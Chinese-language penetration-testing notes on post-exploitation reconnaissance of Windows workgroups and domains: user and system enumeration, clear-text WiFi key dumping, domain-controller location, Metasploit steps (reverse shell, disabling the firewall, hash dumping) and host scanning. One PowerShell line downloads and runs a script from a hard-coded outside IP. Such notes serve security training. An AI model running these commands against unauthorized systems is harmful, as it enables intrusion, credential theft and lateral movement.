## 工作组信息收集
### 用户信息
```shell
# 本机用户列表
net user
# 本机组列表
net localgroup

# 本地管理员信息
net localgroup administrators

quser
query user
query user || user_name  #指定用户查询在线

# 系统中的具体权限
whoami /all
# 当前权限
whoami && whoami /priv
```

### 系统信息
```shell
systeminfo | findstr /B /C: "OS Name" /C:"OS Version"

# 系统版本 win
ver
wmic os list brief
wmic os get Caption,CSDVersion,OSArchitecture,Version
wmic useraccount list brief
```


### 网络信息
```
netstat -ano
netstat -anob

# 路由表和arp缓存
route print
arp -a

# 本机共享列表和可访问的域共享列表
net share
wmic share get name,path,status
```

### 防火墙信息
```shell
netsh firewall show config
```

### wifi密码
```shell
# 需要admin
netsh wlan show profile name="HUAWEI-MINGY" key=clear
```

### 回收站文件
遍历当前系统中所有用户账户, 并将每个用户的回收站的文件列表导出到文本文件`c.txt`中
```
FOR /f "skip=1 tokens=1,2 delims= " %c in ('wmic useraccount get name^,sid') do dir /a /b C:\$Recycle.Bin  
\%d\ ^>%c.txt
```

### WMIC
Windows命令行工具, 获取主机信息, 名称管理
```wmic-info.bat
:: BIOS信息  
wmic BIOS list full /format:htable > wmic.html  
:: CPU信息  
wmic CPU list full /format:htable >> wmic.html  
:: 启动配置管理  
wmic BOOTCONFIG list full /format:htable >> wmic.html  
:: 系统环境管理  
wmic ENVIRONMENT list /format:htable >> wmic.html  
:: 系统帐户管理  
wmic SYSACCOUNT list full /format:htable >> wmic.html  
:: 共享资源管理  
wmic SHARE list full /format:htable >> wmic.html  
:: 进程  
wmic PROCESS get CSName,Description,ExecutablePath,ProcessId /format:htable >> wmic.html  
:: 服务  
wmic SERVICE get Caption,Name,PathName,ServiceType,Started,StartMode,StartName /format:htable >> wmic.htm  l  
:: 用户帐号  
wmic USERACCOUNT list full /format:htable >> wmic.html  
:: 用户组  
wmic GROUP list /format:htable >> wmic.html  
:: 网络接口  
wmic NICCONFIG where IPEnabled='true' get Caption,DefaultIPGateway,Description,DHCPEnabled,DHCPServer,IPAddress,IPSubnet,MACAddress /format:htable >> wmic.html  
:: 硬盘信息  
wmic VOLUME get Label,DeviceID,DriveLetter,FileSystem,Capacity,FreeSpace /format:htable >> wmic.html  
:: 网络共享信息  
wmic NETUSE list full /format:htable >> wmic.html  
:: 安装的Windows补丁  
wmic qfe get Caption,Description,HotFixID,InstalledOn /format:htable >> wmic.html  
:: 启动运行程序  
wmic STARTUP get Caption,Command,Location,User /format:htable >> wmic.html  
:: 安装的软件列表  
wmic PRODUCT get Description,InstallDate,InstallLocation,PackageCache,Vendor,Version /format:htable >> wmic.html  
:: 操作系统  
wmic os get name,version,InstallDate,LastBootUpTime,LocalDateTime,Manufacturer,RegisteredUser,ServicePackMajorVersion,ServicePackMinorVersion,SystemDirectory /format:htable >> wmic.html

:: 时区信息  
wmic Timezone get DaylightName,Description,StandardName /format:htable >> wmic.html
```

### Powershell
[PowerShellMafia/PowerSploit: PowerSploit - A PowerShell Post-Exploitation Framework](https://github.com/PowerShellMafia/PowerSploit)
## 域内信息收集
### net
```shell
# 查询指定域内所有主机
net view /domain:<domain_name>

# 查询域内所有组
net group /domain

# 域管理员的用户组/所有成员
net group "domain admins" /domain
net group "domain computers" /domain

# 域系统管理员用户组: "Enterprise admins"
# 域控制器: "domain controllers"

# 查看域DNS是否和登录域域控信息是否匹配
net config workstation
```

### Dsquery
检索`Active Directory`目录对象如用户, 组, 计算机和OU
```shell
# 查找具有特定通用名称(Common Name, CN)的用户
dsquery user -limit 0 "cn=用户名"
```

### 定位域控
1. 用`ipconfig`获取本地网络接口, 获取DNS
2. 用`nslookup`查询LDAP服务记录, 识别域控机器
	`nslookup -type=all _ldap._tcp.dc._msdcs.mingy.com`
3. `setspn`查询服务主体名称, 识别域控机器
	`netspn -q */*`
4. `net group`查询域控制器组, 直接定位域控组成员
	`net group "domain controllers" /domain`

## MSF内网信息收集
1. 反弹shell
2. 关闭防火墙
3. `getgui`, 打开3389, 执行远程桌面
	- 先用`screenshot`查看是否目标正在被使用
4. 口令破解: meterpreter
	- 格式 `用户名称 : RID : LM-HASH值 : NT-HASH值`
5. `Winenum`: 枚举查询信息
6. 主机发现`/scanner/discovery`, 端口扫描`/scanner/portscan/syn`
7. 服务扫描

## 内网主机存活

Netbios协议应用程序接口, 使应用程序请求网络服务和资源访问, 实现多种解析机制, 将计算机名称解析未IP地址
- Windows Internet Name Service
- 广播查询
- Lmhosts
nmap, msf, Nbtscan
http://www.unixwiz.net/tools/nbtscan.html

ICMP协议检测: 扫描内网C段ping
- Nmap扫描: `-PE`: 使用echo请求ping扫描
- powershell脚本扫描： `Invoke-TSPingSweep.ps1`

UDP协议检测
- Nmap UDP扫描: `-sU`指定UDP扫描
- msf UDP探测
	- `auxiliary/scanner/discovery/udp_probe`
	- `auxiliary/scanner/discovery/udp_sweep`
- unicornscan 工具, 卡里自带

ARP协议检测
- Nmap: `-PR`
- msf: `auxiliary/scanner/discovery/arp_sweep`
- Netdiscover 工具, kali自带
- powershell: `arpscan.ps1`
- `arp-scan`工具, linux/windows
	- https://linux.die.net/man/1/arp-scan
	- https://github.com/QbsuranAlang/arp-scan-windows-/tree/master/arp-scan

SMB协议: 网络文件共享协议
- Nmap: `-sU`
- `crackmapexec` 网络身份验证工具
	- `crackmapexec smb 10.10.10.0/24`
- msf: `auxiliary/scanner/smb/smb_version`

端口检测
https://raw.githubusercontent.com/samratashok/nishang/c3fdf5e5dfa8612d0a17636dbb096b04e987ab31/Scan/Invoke-PortScan.ps1
```shell
powershell iex(new-object net.webclient).downloadstring('http://47.104.255.11:8000/Invoke-PortScan.ps1');  
Invoke-PortScan -StartAddress 10.10.10.1 -EndAddress 10.10.10.255 -ResolveHost -ScanPort
```

## 内网信息收集工具
Fscan: 有用
LadonGo: https://github.com/k8gege/LadonGo
Adfind: [AdFind](https://www.joeware.net/freetools/tools/adfind/index.htm)
BloodHound
